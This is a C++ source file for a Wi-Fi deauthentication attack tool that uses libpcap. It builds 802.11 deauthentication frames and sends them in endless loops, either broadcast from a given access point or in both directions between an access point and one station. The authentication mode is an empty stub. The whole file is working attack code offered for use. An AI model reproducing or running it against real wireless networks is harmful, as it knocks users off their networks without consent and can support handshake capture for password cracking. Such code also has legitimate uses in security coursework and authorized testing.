#include "pch.h"

#include "tools.h"
#include "DeauthAttack.h"


int do_deauth_attack(pcap_t* handle, wlan_deauth_pkt* attack_pkt);
int do_auth_unicast(pcap_t* handle, uint8_t* ap_mac_addr, uint8_t* st_mac_addr);


int main(int argc, char* argv[])
{
    Param param = {
        .if_ = nullptr,
        .ap_mac_ = nullptr,
        .st_mac_ = nullptr,
        .auth_opt_ = false
    };

    if (!parse(&param, argc, argv))
    {
        return -1;
    }

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* handle = pcap_open_live(param.if_, BUFSIZ, 1, 1000, errbuf);
    if (handle == NULL) {
        fprintf(stderr, "pcap_open_live(%s) return null - %s\n", param.if_, errbuf);
        return -1;
    }

    int res = 0;
    switch (argc)
    {
    case 3:
    {
        DeauthAttack* pkt_gen_deauth_broadcast = new DeauthAttack(param.ap_mac_, BROADCAST_MAC_ADDR, AP_TO_BROADCAST);
        wlan_deauth_pkt* attack_pkt = pkt_gen_deauth_broadcast->get_pkt();

        while (res == 0)
        {
            res = do_deauth_attack(handle, attack_pkt);
        }
        break;
    }
    case 4:
    {
        DeauthAttack* pkt_gen_deauth_unicast_ap_to_st = new DeauthAttack(param.ap_mac_, param.st_mac_, AP_TO_STATION);
        wlan_deauth_pkt* attack_pkt_ap_to_st = pkt_gen_deauth_unicast_ap_to_st->get_pkt();
        
        DeauthAttack* pkt_gen_deauth_unicast_st_to_ap = new DeauthAttack(param.ap_mac_, param.st_mac_, STATION_TO_AP);
        wlan_deauth_pkt* attack_pkt_st_to_ap = pkt_gen_deauth_unicast_st_to_ap->get_pkt();

        while (true)
        {
            res = do_deauth_attack(handle, attack_pkt_ap_to_st);
            if (res != 0)
            {
                break;
            }
            
            res = do_deauth_attack(handle, attack_pkt_st_to_ap);
            if (res != 0)
            {
                break;
            }
        }
        break;
    }
    case 5:
    {
        res = do_auth_unicast(handle, param.ap_mac_, param.st_mac_);
        if (res != 0)
        {
            return -1;
        }
        break;
    }
    default:
        break;
    }
    
	return 0;
}


int do_deauth_attack(pcap_t* handle, wlan_deauth_pkt* attack_pkt)
{
    int res = pcap_sendpacket(handle, attack_pkt->packet, attack_pkt->size);
    if (res != 0)
    {
        fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
        pcap_close(handle);
        return -1;
    }
    return 0;
}


int do_auth_unicast(pcap_t* handle, uint8_t* ap_mac_addr, uint8_t* st_mac_addr)
{
    return 0;
}
